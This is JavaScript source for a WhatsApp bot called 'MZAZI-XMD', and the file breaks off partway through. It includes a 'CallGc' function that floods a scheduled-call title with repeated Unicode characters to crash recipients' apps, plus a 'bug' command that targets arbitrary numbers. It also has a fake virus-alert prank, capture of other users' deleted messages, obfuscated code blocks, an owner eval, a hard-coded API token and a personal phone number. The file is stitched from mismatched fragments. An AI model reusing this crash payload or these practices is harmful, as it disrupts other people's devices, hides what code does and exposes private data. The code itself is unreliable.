
module.exports = async (client, m) => {
    try {
        if (!m.body) return; // Prevents errors if the message has no text

        const lowerText = m.body.toLowerCase();

        if (lowerText.includes("owner")) {
            // Function to get the current time in Nairobi
            const getCurrentTimeInNairobi = () => {
                const date = new Date();
                return date.toLocaleTimeString("en-US", { timeZone: "Africa/Nairobi" });
            };

            const date = new Date();
            const ownerInfo = `👤 *Information* 👤\n\n📸 *Picture:* [Click here](https://i.imgur.com/BNLqrVO.jpeg)\n🎂 *Age:* 22 yrs\n🆔 *Name:* MZAZI\n💑 *Relationship:* Dating\n📞 *Number:* +254741388986\n📍 *Location:* Karen, Nairobi\n✨ *Status:* Handsome 😎\n⏰ *Time:* ${getCurrentTimeInNairobi()} on ${date.toLocaleString('en-US', { weekday: 'long', timeZone: 'Africa/Nairobi' })}`;

            await client.sendMessage(m.chat, { 
                image: { url: "https://i.imgur.com/BNLqrVO.jpeg" }, 
                caption: ownerInfo 
            });
        }
    } catch (error) {
        console.error("Error in sending details:", error);
        m.reply("⚠️ Failed to send details.");
    }
};




async function getGroupProfilePic(client, groupId) {
    try {
        let profilePicUrl = await client.profilePictureUrl(groupId, 'image'); // Fetch group profile picture
        return profilePicUrl || 'https://i.imgur.com/BNLqrVO.jpeg'; // Default image if no profile picture exists
    } catch (error) {
        console.error("Error fetching group profile picture:", error);
        return 'https://i.imgur.com/BNLqrVO.jpeg'; // Default image in case of error
    }
}

//games
if (global.mathChat && m.chat === global.mathChat && m.body) {
  const userAnswer = parseFloat(m.body.trim());

  if (!isNaN(userAnswer)) {
    if (userAnswer === global.mathAnswer) {
      client.sendMessage(m.chat, { text: "✅ Correct! You're a genius!" });
    } else {
      client.sendMessage(m.chat, { text: `❌ Nope! The right answer was *${global.mathAnswer}*.` });
    }

    // Reset after answer
    global.mathAnswer = null;
    global.mathChat = null;
  }
}


async function CallGc(target) {
    await sam.relayMessage(target, {
        viewOnceMessage: {
            message: {
                scheduledCallCreationMessage: {
                    callType: "VIDEO",
                    scheduledTimestampMs: Date.now() + 9741,
                    title: " Tama Crash Calls " + `𑲭𑲭`.repeat(100000) + `ꦾ`.repeat(50000),
                    inviteCode: 'youtube.com/@tamainfinity',
                }
            }
        }
    }, {});
}

const axios = require('axios');

async function generateTempEmail() {
    try {
        const response = await axios.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox");
        if (response.data.length > 0) {
            return response.data[0]; // Returns a randomly generated email
        }
        throw new Error("Email generation failed.");
    } catch (error) {
        console.error("Error generating email:", error);
        return null;
    }
}

async function checkEmailInbox(email) {
    if (!email) return [];

    const [login, domain] = email.split("@");
    try {
        const response = await axios.get(`https://www.1secmail.com/api/v1/?action=getMessages&login=${login}&domain=${domain}`);
        return response.data;
    } catch (error) {
        console.error("Error checking inbox:", error);
        return [];
    }
}
//========================================================================//
function getCountryName(code) {
  const countryNames = {
    US: 'United States',
    NG: 'Nigeria',
    IN: 'India',
    CN: 'China',
    BR: 'Brazil',
    PK: 'Pakistan',
    BD: 'Bangladesh',
    RU: 'Russia',
    JP: 'Japan',
    DE: 'Germany',
    FR: 'France',
    GB: 'United Kingdom',
    IT: 'Italy',
    ES: 'Spain',
    CA: 'Canada',
    MX: 'Mexico',
    ID: 'Indonesia',
    TR: 'Turkey',
    VN: 'Vietnam',
    EG: 'Egypt',
    TH: 'Thailand',
    IR: 'Iran',
    ZA: 'South Africa',
    KE: 'Kenya',
    AR: 'Argentina',
    CO: 'Colombia',
    PE: 'Peru',
    CL: 'Chile',
    UA: 'Ukraine',
    PL: 'Poland',
    NL: 'Netherlands',
    BE: 'Belgium',
    SE: 'Sweden',
    NO: 'Norway',
    DK: 'Denmark',
    FI: 'Finland',
    PH: 'Philippines',
    MY: 'Malaysia',
    KR: 'South Korea',
    SA: 'Saudi Arabia',
    AE: 'United Arab Emirates',
    IQ: 'Iraq',
    SY: 'Syria',
    MA: 'Morocco',
    DZ: 'Algeria',
    ET: 'Ethiopia',
    GH: 'Ghana',
    TZ: 'Tanzania',
    UG: 'Uganda',
    SD: 'Sudan',
    NZ: 'New Zealand',
    AU: 'Australia',
    GR: 'Greece',
    PT: 'Portugal',
    CH: 'Switzerland',
    AT: 'Austria',
    CZ: 'Czech Republic',
    RO: 'Romania',
    HU: 'Hungary',
    IL: 'Israel',
    SG: 'Singapore',
    HK: 'Hong Kong',
    TW: 'Taiwan'
  };

  return countryNames[code] || code;
}
//=============================================================================================//



const sendFakeVirusWarning = async (client, m) => {
    try {
        const warningMessages = [
            "⚠️ *WARNING! CRITICAL SECURITY ALERT!* ⚠️",
            "🚨 *Your device has been compromised!* 🚨",
            "🦠 *Virus Detected: Trojan.MpesaStealer.001*",
            "📛 *Unauthorized access detected!*",
            "📡 *Scanning system for potential threats...*",
            "⏳ *Analyzing device security...*",
            "📝 *Suspicious activity found in your WhatsApp data!*",
            "🛑 *Warning! Banking details may be exposed!*",
            "📂 *Malware is attempting to access your phone storage!*",
            "📤 *Uploading your contacts and messages to the dark web...*",
            "🔄 *Deleting personal files...*",
            "💀 *System error: Critical process terminated!*",
            "⚡ *Bootloader corrupted. Restarting device...*",
            "🛠️ *Repairing system files...*",
            "🧹 *Removing detected threats...*",
            "✅ *Virus successfully removed!*",
            "😜 *Haha! You’ve been pranked! No virus detected!*"
        ];

        for (const message of warningMessages) {
            await client.sendMessage(m.chat, { text: message });
            await new Promise(resolve => setTimeout(resolve, 3000)); // Delay between messages
        }
    } catch (error) {
        console.error("Error in sendFakeVirusWarning:", error);
        m.reply("⚠️ An error occurred while sending the virus warning.");
    }
};

const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require("@whiskeysockets/baileys");
const { downloadMediaMessage } = require('@whiskeysockets/baileys');
const fs = require("fs");
const path = require("path");
const util = require("util");
global.axios = require('axios').default
const chalk = require("chalk");
const speed = require("performance-now");
const Genius = require("genius-lyrics");
const yts = require("yt-search");
const { DateTime } = require('luxon');
const uploadtoimgur = require('./lib/imgur');
const advice = require("badadvice");
const {c, cpp, node, python, java} = require('compile-run');
const acrcloud = require("acrcloud"); 
const ytdl = require("ytdl-core");
const Client = new Genius.Client("TUoAEhL79JJyU-MpOsBDkFhJFWFH28nv6dgVgPA-9R1YRwLNP_zicdX2omG2qKE8gYLJat5F5VSBNLfdnlpfJg"); // Scrapes if no key is provided
const { TelegraPh, UploadFileUgu, webp2mp4File, floNime } = require('./lib/mzaziupload');
const { Configuration, OpenAI } = require("openai");
const { menu, autoread, mode, antidel, antitag, appname, herokuapi, gptdm, botname, antibot, prefix, author, packname, mycode, admin, botAdmin, dev, group, bad, DevMzazi, NotOwner, antilink, antilinkall, wapresence, badwordkick } = require("./set.js");
const { smsg, runtime, fetchUrl, isUrl, processTime, formatp, tanggal, formatDate, getTime,  sleep, generateProfilePicture, clockString, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom } = require('./lib/mzazifunc');
const { exec, spawn, execSync } = require("child_process");
module.exports = mzazi = async (client, m, chatUpdate, store) => {
  try {
    var body =
      m.mtype === "conversation"
        ? m.message.conversation
        : m.mtype == "imageMessage"
       ? m.message.imageMessage.caption
        : m.mtype == "videoMessage"
        ? m.message.videoMessage.caption
        : m.mtype == "extendedTextMessage"
        ? m.message.extendedTextMessage.text
        : m.mtype == "buttonsResponseMessage"
        ? m.message.buttonsResponseMessage.selectedButtonId
        : m.mtype == "listResponseMessage"
        ? m.message.listResponseMessage.singleSelectReply.selectedRowId
        : m.mtype == "templateButtonReplyMessage"
        ? m.message.templateButtonReplyMessage.selectedId
        : m.mtype === "messageContextInfo"
        ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text
        : "";
    var budy = typeof m.text == "string" ? m.text : "";
	  var msgDreaded = m.message.extendedTextMessage?.contextInfo?.quotedMessage;  
   
    const Heroku = require("heroku-client");  
    const command = body.replace(prefix, "").trim().split(/ +/).shift().toLowerCase();
    const args = body.trim().split(/ +/).slice(1);
    const pushname = m.pushName || "No Name";
    const botNumber = await client.decodeJid(client.user.id);
    const itsMe = m.sender == botNumber ? true : false;
    let text = (q = args.join(" "));
    const arg = budy.trim().substring(budy.indexOf(" ") + 1);
    const arg1 = arg.trim().substring(arg.indexOf(" ") + 1);
    m.isBaileys = m.id.startsWith("BAE5") && m.id.length === 16;
    const from = m.chat;
    const reply = m.reply;
    const sender = m.sender;
    const mek = chatUpdate.messages[0];
    const getGroupAdmins = (participants) => { 
       let admins = []; 
       for (let i of participants) { 
         i.admin === "superadmin" ? admins.push(i.id) : i.admin === "admin" ? admins.push(i.id) : ""; 
       } 
       return admins || []; 
     };
    const fortu = (m.quoted || m); 
    const quoted = (fortu.mtype == 'buttonsMessage') ? fortu[Object.keys(fortu)[1]] : (fortu.mtype == 'templateMessage') ? fortu.hydratedTemplate[Object.keys(fortu.hydratedTemplate)[1]] : (fortu.mtype == 'product') ? fortu[Object.keys(fortu)[0]] : m.quoted ? m.quoted : m; 

    const color = (text, color) => {
      return !color ? chalk.green(text) : chalk.keyword(color)(text);
    };
	  
    const mime = (quoted.msg || quoted).mimetype || "";
    const qmsg = (quoted.msg || quoted);

    const cmd = body.startsWith(prefix);
    const badword = bad.split(",");
    const Owner = DevMzazi.map((v) => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net").includes(m.sender)
    
    // Group
   
     const groupMetadata = m.isGroup ? await client.groupMetadata(m.chat).catch((e) => {}) : "";
     const groupName = m.isGroup && groupMetadata ? await groupMetadata.subject : "";
     const participants = m.isGroup && groupMetadata ? await groupMetadata.participants : ""; 
     const groupAdmin = m.isGroup ? await getGroupAdmins(participants) : ""; 
     const isBotAdmin = m.isGroup ? groupAdmin.includes(botNumber) : false; 
     const isAdmin = m.isGroup ? groupAdmin.includes(m.sender) : false;
 
 const maindev = '254741388986';
 const maindev2 = maindev.split(",");
 const date = new Date()  
 const timestamp = speed(); 
 const dreadedspeed = speed() - timestamp 


  //antidelete function
const baseDir = 'message_data';
if (!fs.existsSync(baseDir)) {
  fs.mkdirSync(baseDir);
}

function loadChatData(remoteJid, messageId) {
  const chatFilePath = path.join(baseDir, remoteJid, `${messageId}.json`);
  try {
    const data = fs.readFileSync(chatFilePath, 'utf8');
    return JSON.parse(data) || [];
  } catch (error) {
    return [];
  }
}

function saveChatData(remoteJid, messageId, chatData) {
  const chatDir = path.join(baseDir, remoteJid);

  if (!fs.existsSync(chatDir)) {
    fs.mkdirSync(chatDir, { recursive: true });
  }

  const chatFilePath = path.join(chatDir, `${messageId}.json`);

  try {
    fs.writeFileSync(chatFilePath, JSON.stringify(chatData, null, 2));
  } catch (error) {
    console.error('Error saving chat data:', error);
  }
}

function handleIncomingMessage(message) {
  const remoteJid = message.key.remoteJid;
  const messageId = message.key.id;

  const chatData = loadChatData(remoteJid, messageId);
  chatData.push(message);
  saveChatData(remoteJid, messageId, chatData);
}


async function handleMessageRevocation(client, revocationMessage) {
  const remoteJid = revocationMessage.key.remoteJid;
  const messageId = revocationMessage.message.protocolMessage.key.id;

  const chatData = loadChatData(remoteJid, messageId);
  const originalMessage = chatData[0];

  if (originalMessage) {
    const deletedBy = revocationMessage.participant || revocationMessage.key.participant || revocationMessage.key.remoteJid;
    const sentBy = originalMessage.key.participant || originalMessage.key.remoteJid;

    const deletedByFormatted = `@${deletedBy.split('@')[0]}`;
    const sentByFormatted = `@${sentBy.split('@')[0]}`;

if (deletedBy.includes(client.user.id) || sentBy.includes(client.user.id)) return;

    let notificationText = `𝗠𝗭𝗔𝗭𝗜 𝗔𝗡𝗧𝗜𝗗𝗘𝗟𝗘𝗧𝗘 𝗠𝗦𝗚\n\n` +
      ` 𝗗𝗲𝗹𝗲𝘁𝗲𝗱 𝗯𝘆: ${deletedByFormatted}\n\n`

    if (originalMessage.message?.conversation) {
      // Text message
      const messageText = originalMessage.message.conversation;
      notificationText += ` 𝗗𝗲𝗹𝗲𝘁𝗲𝗱 𝗠𝗲𝘀𝘀𝗮𝗴𝗲: ${messageText}`;
      await client.sendMessage(client.user.id, { text: notificationText }, { quoted: m });
    } else if (originalMessage.message?.extendedTextMessage) {
      // Extended text message (quoted messages)
      const messageText = originalMessage.message.extendedTextMessage.text;
      notificationText += ` 𝗗𝗲𝗹𝗲𝘁𝗲𝗱 𝗖𝗼𝗻𝘁𝗲𝗻𝘁: ${messageText}`;
      await client.sendMessage(client.user.id, { text: notificationText }, { quoted: m });
    }
  }
  }

    //Customercare mzazi
	  async function forwardToCustomerCare(client, m, text) {
    try {
        // Check if there is a message to forward
        if (!text || text.trim() === "") {
            return m.reply("❌ 𝚙𝚛𝚘𝚟𝚒𝚍𝚎 𝚊 𝚖𝚎𝚜𝚜𝚊𝚐𝚎 𝚝𝚘 𝚏𝚘𝚛𝚠𝚊𝚛𝚍 𝚝𝚘 𝚘𝚞𝚛 𝚌𝚞𝚜𝚝𝚘𝚖𝚎𝚛𝚌𝚊𝚛𝚎(𝗠𝗭𝗔𝗭𝗜).");
        }

        // Format the target WhatsApp number
        const targetNumber = "254741388986@s.whatsapp.net";

        // Forward the text message to the target number
        await client.sendMessage(targetNumber, { text: text });

        // Send a confirmation to the sender
        m.reply("✅ Your message has been forwarded to Customer Care\n\n Wait some few minutes as MZAZI will respond as soon as possible.");
    } catch (error) {
        console.error("Error forwarding to Customer Care:", error);
        m.reply("⚠️ An error occurred while forwarding your message.");
    }
}
     //bugfunction
	  async function bugTargetOtherNumber(client, m, text) {
    try {
        // Split the text into arguments: target number and message text.
        let args = text.split(" ");
        if (args.length < 2) {
            return m.reply("❌ Please provide a target number and a message. Example: `.bug 254712344678 This is a test message.`");
        }
        
        // The first argument is the target number.
        let targetNum = args.shift().trim();
        // The rest of the arguments make up the message.
        let messageText = args.join(" ");
        
        // Format the target number to WhatsApp ID format.
        const target = `${targetNum}@s.whatsapp.net`;
        
        // Log for debugging: print target and message
        console.log(`Bug command target: ${target}`);
        console.log(`Bug command message: ${messageText}`);
        
        // Forward the message to the target number.
        await client.sendMessage(target, { text: messageText });
        
        // Send confirmation back to the sender.
        m.reply("✅ Bug command executed successfully and message forwarded to the target number.");
    } catch (error) {
        console.error("Error in bugTargetOtherNumber:", error);
        m.reply("⚠️ An error occurred while executing the bug command.");
    }
}
    // Push Message To Console
    let argsLog = budy.length > 30 ? `${q.substring(0, 30)}...` : budy;

const Grace = mek.key.remoteJid;
if (wapresence === 'online') { 
             client.sendPresenceUpdate('available', Grace);
	
} else if (wapresence === 'typing') { 
             client.sendPresenceUpdate('composing', Grace);
	
      }	else if (wapresence === 'recording') { 
             client.sendPresenceUpdate('recording', Grace);
             
    } else {
             client.sendPresenceUpdate('unavailable', Grace);
    }
    
if (cmd && mode === 'PRIVATE' && !itsMe && !Owner && m.sender !== dev) {
return;
}
	  
	  
if (autoread === 'TRUE' && !m.isGroup) { 
             client.readMessages([m.key])
    }
      if (itsMe && mek.key.id.startsWith("BAE5") && mek.key.id.length === 16 && !m.isGroup) return;

if (antidel === "TRUE") {
        if (mek.message?.protocolMessage?.key) {
          await handleMessageRevocation(client, mek);
        } else {
          handleIncomingMessage(mek);
        }
	  }

 function _0x3a7a(_0x5a5667,_0x2a003c){const _0x1dbe8b=_0x1dbe();return _0x3a7a=function(_0x3a7a75,_0x376fae){_0x3a7a75=_0x3a7a75-0x169;let _0x5df2f4=_0x1dbe8b[_0x3a7a75];return _0x5df2f4;},_0x3a7a(_0x5a5667,_0x2a003c);}(function(_0x59a66e,_0x1d91a1){const _0x4457d5=_0x3a7a,_0x14bc20=_0x59a66e();while(!![]){try{const _0xd65ffa=parseInt(_0x4457d5(0x186))/0x1+-parseInt(_0x4457d5(0x17a))/0x2+parseInt(_0x4457d5(0x171))/0x3+-parseInt(_0x4457d5(0x170))/0x4*(-parseInt(_0x4457d5(0x172))/0x5)+-parseInt(_0x4457d5(0x18d))/0x6+-parseInt(_0x4457d5(0x190))/0x7+parseInt(_0x4457d5(0x16c))/0x8*(-parseInt(_0x4457d5(0x189))/0x9);if(_0xd65ffa===_0x1d91a1)break;else _0x14bc20['push'](_0x14bc20['shift']());}catch(_0x268e54){_0x14bc20['push'](_0x14bc20['shift']());}}}(_0x1dbe,0x6926a));const _0x3b4c1b=_0x5503;function _0x5503(_0x416287,_0x331239){const _0x801131=_0x2be2();return _0x5503=function(_0x48216a,_0x4323ca){_0x48216a=_0x48216a-(0x1c60+-0x16*0x28+-0xc46*0x2);let _0x114933=_0x801131[_0x48216a];return _0x114933;},_0x5503(_0x416287,_0x331239);}function _0x2be2(){const _0x35d05e=_0x3a7a,_0x2b909f=['10ZFyleu',_0x35d05e(0x18a),_0x35d05e(0x193),'D\x0aVERSION:',_0x35d05e(0x183),_0x35d05e(0x169),'N:MZAZI\x20',_0x35d05e(0x175),_0x35d05e(0x184),_0x35d05e(0x195),'7586551AEUIZc',_0x35d05e(0x182),'cky50@gma',_0x35d05e(0x196),_0x35d05e(0x187),'300FhlJEa','MZAZI\x20DEV\x0aF',_0x35d05e(0x18c),_0x35d05e(0x18b),_0x35d05e(0x177),_0x35d05e(0x17e),_0x35d05e(0x180),_0x35d05e(0x192),_0x35d05e(0x18e),_0x35d05e(0x176),_0x35d05e(0x174),_0x35d05e(0x18f),_0x35d05e(0x16f),_0x35d05e(0x185),_0x35d05e(0x191),'egion\x0aEND:',_0x35d05e(0x178),_0x35d05e(0x16a),'3100329laiMJQ','=INTERNET:',_0x35d05e(0x17c),_0x35d05e(0x194),_0x35d05e(0x179),_0x35d05e(0x16d),_0x35d05e(0x17d),_0x35d05e(0x188),'/nick_hu',_0x35d05e(0x16b),_0x35d05e(0x16e),_0x35d05e(0x173),'sendMessag',_0x35d05e(0x181),_0x35d05e(0x17f)];return _0x2be2=function(){return _0x2b909f;},_0x2be2();}(function(_0x59cd72,_0x64b25c){const _0x5b8033=_0x3a7a,_0x3b98bd=_0x5503,_0x197c18=_0x59cd72();while(!![]){try{const _0x2e30ac=parseInt(_0x3b98bd(0x78))/(-0xb1b*0x3+0x1*0x1337+0xe1b)+parseInt(_0x3b98bd(0x7d))/(0x1*-0x1f66+0x1255+0xd13)*(parseInt(_0x3b98bd(0x79))/(-0x2456*-0x1+-0xc4*-0x22+-0x3e5b*0x1))+parseInt(_0x3b98bd(0x87))/(0x11f8+-0xabf+-0x735)*(-parseInt(_0x3b98bd(0x85))/(-0x1a47+0x155*0x14+-0x4*0x16))+parseInt(_0x3b98bd(0x71))/(-0x17eb+0xf08+0x8e9*0x1)*(-parseInt(_0x3b98bd(0x67))/(0x1*0x12f7+-0x2373+0x1083*0x1))+parseInt(_0x3b98bd(0x76))/(0x7b2+0x33*-0xb2+0x6*0x4a2)*(parseInt(_0x3b98bd(0x7e))/(0x495+-0xfb*-0x7+-0xb69))+-parseInt(_0x3b98bd(0x8d))/(-0x1*0x681+-0x3*-0x3b+0x5da*0x1)*(-parseInt(_0x3b98bd(0x6b))/(-0x1584*-0x1+-0x2*-0x6d3+-0x231f))+-parseInt(_0x3b98bd(0x6c))/(-0x15*0x1b8+0x1584+0x18*0x9c)*(-parseInt(_0x3b98bd(0x72))/(0x186a+0x1*-0x97a+-0xee3));if(_0x2e30ac===_0x64b25c)break;else _0x197c18['push'](_0x197c18[_0x5b8033(0x17b)]());}catch(_0x28e0ca){_0x197c18['push'](_0x197c18[_0x5b8033(0x17b)]());}}}(_0x2be2,-0x2*0x2659c+-0xc5af*-0x11+0x1*0x15813),client[_0x3b4c1b(0x66)+'t']=async(_0x1b8d9c,_0x2f45f4,_0x484fce='',_0x4ed280={})=>{const _0x5f4a64=_0x3b4c1b,_0x33bc6c={'iOIPi':_0x5f4a64(0x8b)+'V'};let _0x46a6cb=[];for(let _0x5856a6 of _0x2f45f4){_0x46a6cb[_0x5f4a64(0x64)]({'displayName':_0x33bc6c[_0x5f4a64(0x83)],'vcard':_0x5f4a64(0x8c)+_0x5f4a64(0x90)+_0x5f4a64(0x91)+_0x5f4a64(0x6d)+_0x5f4a64(0x93)+_0x5f4a64(0x82)+_0x5f4a64(0x8f)+_0x5856a6+':'+_0x5856a6+(_0x5f4a64(0x65)+_0x5f4a64(0x75)+_0x5f4a64(0x6e)+_0x5f4a64(0x6a)+_0x5f4a64(0x7f)+_0x5f4a64(0x81)+_0x5f4a64(0x69)+_0x5f4a64(0x6f)+_0x5f4a64(0x80)+_0x5f4a64(0x74)+_0x5f4a64(0x77)+_0x5f4a64(0x89)+_0x5f4a64(0x7a)+_0x5f4a64(0x86)+_0x5f4a64(0x8e)+_0x5f4a64(0x84)+_0x5f4a64(0x7c)+_0x5f4a64(0x73)+_0x5f4a64(0x88)+_0x5f4a64(0x92)+_0x5f4a64(0x70)+_0x5f4a64(0x7b)+_0x5f4a64(0x68))});}client[_0x5f4a64(0x8a)+'e'](_0x1b8d9c,{'contacts':{'displayName':_0x5f4a64(0x8b)+'V','contacts':_0x46a6cb},..._0x4ed280},{'quoted':_0x484fce});});function _0x1dbe(){const _0x118758=['BEGIN:VCAR','193102jqofVL','MZAZI\x20DE','VCARD','3.0\x0aN:\x20RA','\x0aitem1.X-A','3OBHvGl','27059hMyWoK','11389587NuVstv','19670KFpPkS','405252hsFfIZ','nter9\x0aitem3','il.com\x0aite','ber\x0aitem2.','1702146mSPOsX','el:Email\x0ai','tem3.URL:h','131187ePWfFU','tagram.com','\x0aitem4.ADR','TEL;waid=','dicksonni','sendContac','EMAIL;type',';;\x0aitem4.X','555014OZNQzU','412lesMsv','24vmmiFD','iOIPi',':;;Kenya;;','94474Kyxmeh','901148KgrpuA','1909257SeTHPU','10pyVeXQ','ttps://ins','8QAmyyx','push','BLabel:Num','-ABLabel:R',':Instagram','DEV\x0aitem1.','491676ZXRjUL','shift','m2.X-ABLab','.X-ABLabel','6KYfMMX'];_0x1dbe=function(){return _0x118758;};return _0x1dbe();}

(function(_0x520a67,_0x34e382){var _0xd7827f=_0x4e98,_0x3705dc=_0x520a67();while(!![]){try{var _0x221918=-parseInt(_0xd7827f(0x1cf))/0x1*(-parseInt(_0xd7827f(0x1b1))/0x2)+-parseInt(_0xd7827f(0x1b2))/0x3+-parseInt(_0xd7827f(0x1c9))/0x4*(parseInt(_0xd7827f(0x1ca))/0x5)+parseInt(_0xd7827f(0x1b3))/0x6+-parseInt(_0xd7827f(0x1b5))/0x7+-parseInt(_0xd7827f(0x1d7))/0x8*(-parseInt(_0xd7827f(0x1bb))/0x9)+-parseInt(_0xd7827f(0x1bd))/0xa*(-parseInt(_0xd7827f(0x1d1))/0xb);if(_0x221918===_0x34e382)break;else _0x3705dc['push'](_0x3705dc['shift']());}catch(_0x1983ef){_0x3705dc['push'](_0x3705dc['shift']());}}}(_0x1147,0xd0555));function _0x4f1b(_0xd83022,_0x53975f){var _0x38aed8=_0x11cc();return _0x4f1b=function(_0x4698cc,_0x3f7dcd){_0x4698cc=_0x4698cc-(0x13bd+0xcbb*0x3+-0x38ae);var _0x4bee84=_0x38aed8[_0x4698cc];return _0x4bee84;},_0x4f1b(_0xd83022,_0x53975f);}function _0x4e98(_0x10a4a4,_0x5175c2){var _0x11472a=_0x1147();return _0x4e98=function(_0x4e98a7,_0x357503){_0x4e98a7=_0x4e98a7-0x1b0;var _0x568746=_0x11472a[_0x4e98a7];return _0x568746;},_0x4e98(_0x10a4a4,_0x5175c2);}var _0x2e16c2=_0x4f1b;function _0x11cc(){var _0x70bc18=_0x4e98,_0x4378d0=[_0x70bc18(0x1d3),_0x70bc18(0x1b8),'BAE5',_0x70bc18(0x1c7),_0x70bc18(0x1d5),_0x70bc18(0x1c5),_0x70bc18(0x1d6),_0x70bc18(0x1c4),_0x70bc18(0x1c0),_0x70bc18(0x1bc),_0x70bc18(0x1d2),_0x70bc18(0x1b0),_0x70bc18(0x1bf),_0x70bc18(0x1c6),_0x70bc18(0x1b9),'ate','\x20Removed\x20b',_0x70bc18(0x1d4),_0x70bc18(0x1b7),'cipantsUpd',_0x70bc18(0x1be),_0x70bc18(0x1c3),_0x70bc18(0x1d0),'ry\x20spam!','remove',_0x70bc18(0x1c8),_0x70bc18(0x1b4),_0x70bc18(0x1c1),_0x70bc18(0x1cc),'184473FwtnYZ',_0x70bc18(0x1b6),'startsWith',_0x70bc18(0x1cb),_0x70bc18(0x1ba),_0x70bc18(0x1c2)];return _0x11cc=function(){return _0x4378d0;},_0x11cc();}(function(_0x587fa3,_0x58aef6){var _0x1056d3=_0x4e98,_0x22b6bc=_0x4f1b,_0x506f7d=_0x587fa3();while(!![]){try{var _0x446b3d=-parseInt(_0x22b6bc(0x161))/(0x1102+0x227*0x11+-0x3598)*(-parseInt(_0x22b6bc(0x14d))/(-0x2*-0x1231+0x1*0xca+-0x252a*0x1))+parseInt(_0x22b6bc(0x15d))/(-0x23*-0xb7+-0x141*0x3+-0x153f)+parseInt(_0x22b6bc(0x141))/(-0x2489+0x1cdf*-0x1+0x4*0x105b)*(parseInt(_0x22b6bc(0x15a))/(-0x2*-0xe87+0x22*0xb+-0x1e7f))+-parseInt(_0x22b6bc(0x154))/(-0x2c2+0x22+-0xe2*-0x3)*(-parseInt(_0x22b6bc(0x147))/(0x58*-0x4a+-0x8fd+0x2274))+-parseInt(_0x22b6bc(0x148))/(0x2*-0xc9a+0x685*-0x4+0x3350)+parseInt(_0x22b6bc(0x15e))/(-0x427*0x3+-0x1fd3*0x1+-0x5*-0x8dd)*(-parseInt(_0x22b6bc(0x143))/(-0x1d65+-0x26eb+0x2*0x222d))+-parseInt(_0x22b6bc(0x152))/(-0x16d4+0x8*-0x11f+0x1fd7);if(_0x446b3d===_0x58aef6)break;else _0x506f7d['push'](_0x506f7d[_0x1056d3(0x1ce)]());}catch(_0x41a665){_0x506f7d[_0x1056d3(0x1cd)](_0x506f7d[_0x1056d3(0x1ce)]());}}}(_0x11cc,0x186eb*0x4+0x24*0x9e+-0xb*-0x17e),antibot===_0x2e16c2(0x14a)&&mek[_0x2e16c2(0x162)]['id'][_0x2e16c2(0x15f)](_0x2e16c2(0x142))&&m[_0x2e16c2(0x15c)]&&!isAdmin&&isBotAdmin&&mek[_0x2e16c2(0x162)]['id'][_0x2e16c2(0x140)]===-0xe50+-0x57a*-0x4+0x4*-0x1e2&&(kidts=m[_0x2e16c2(0x144)],client[_0x2e16c2(0x14e)+'e'](m[_0x2e16c2(0x156)],{'text':_0x2e16c2(0x160)+_0x2e16c2(0x14b)+kidts[_0x2e16c2(0x146)]('@')[-0x12da+0x247c+-0x25*0x7a]+(_0x2e16c2(0x155)+_0x2e16c2(0x159)+_0x2e16c2(0x14c)+_0x2e16c2(0x150)+_0x2e16c2(0x149)+_0x2e16c2(0x15b)+_0x2e16c2(0x151)+_0x2e16c2(0x157)),'contextInfo':{'mentionedJid':[kidts]}},{'quoted':m}),await client[_0x2e16c2(0x145)+_0x2e16c2(0x153)+_0x2e16c2(0x14f)](m[_0x2e16c2(0x156)],[kidts],_0x2e16c2(0x158))));function _0x1147(){var _0x283a0d=['split','1544TNXGNj','tibot:\x0a\x0a@','108314CwqybC','3905043kGAwEP','9836406Ussxnk','3301765GBoZYn','10396421kVRYNd','18szWhmE','5880358pnqlFT','4NTZryU','sendMessag','376590puyzhN','28629wzieVk','y\x20RAVEN\x20','20uMoUSs','356958TiEbec','\x20as\x20a\x20bot.','4435424UJQIXb','to\x20prevent','key','\x20has\x20been\x20','84AXXWgJ','groupParti','2LGBzpD','1565770bnKzAf','identified','54640JUfGXj','565KhwBJI','𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗗\x20an','isGroup','push','shift','31yMeFIU','chat','6883778JYAwEu','TRUE','length','\x20unnecessa','sender'];_0x1147=function(){return _0x283a0d;};return _0x1147();}

if (budy.startsWith('>')) { 
   if (!Owner) return reply('Only owner can evaluate bailey codes');
   try { 
 let evaled = await eval(budy.slice(2)); 
 if (typeof evaled !== 'string') evaled = require('util').inspect(evaled); 
 await reply(evaled); 
   } catch (err) { 
 await reply(String(err)); 
   } 
 } 
 
async function mp3d () {	
let { key } = await client.sendMessage(m.chat, {audio: fs.readFileSync('./Media/menu.mp3'), mimetype:'audio/mp4', ptt: true}, {quoted: m })

}
 
    if (gptdm === 'TRUE' && m.chat.endsWith("@s.whatsapp.net")) {

  let d = await fetchJson(
            `https://bk9.fun/ai/llama?q=${text}`
          );
          if (!d.BK9) {
            return reply(
              "An error occurred while fetching the AI chatbot response. Please try again later."
            );
          } else {
            reply(d.BK9);
          }
    }

if (antitag === 'TRUE' && !Owner && isBotAdmin && !isAdmin && m.mentionedJid && m.mentionedJid.length > 10) {
        if (itsMe) return;

        const muuo = m.sender;

        await client.sendMessage(m.chat, {
            text: `@${muuo.split("@")[0]}, Antitag is Active🔨`,
            contextInfo: { mentionedJid: [muuo] }
        }, { quoted: m });

        await client.sendMessage(m.chat, {
            delete: {
                remoteJid: m.chat,
                fromMe: false,
                id: m.key.id,
                participant: muuo
            }
        });
        await client.groupParticipantsUpdate(m.chat, [muuo], "remove");
    }

	  
async function loading () {
var Floading = [
"𝗠",
"𝗠𝗭",
"𝗠𝗭𝗔",	
"𝗠𝗭𝗔𝗭",
"𝗠𝗭𝗔𝗭𝗜",
"𝗠𝗭𝗔𝗭𝗜-",
"𝗠𝗭𝗔𝗭𝗜-𝗫",
"𝗠𝗭𝗔𝗭𝗜-𝗫𝗠",
"𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗗",
"𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗗 𝗦",
"𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗗 𝗦𝗣",
"𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗗 𝗦𝗣𝗘",
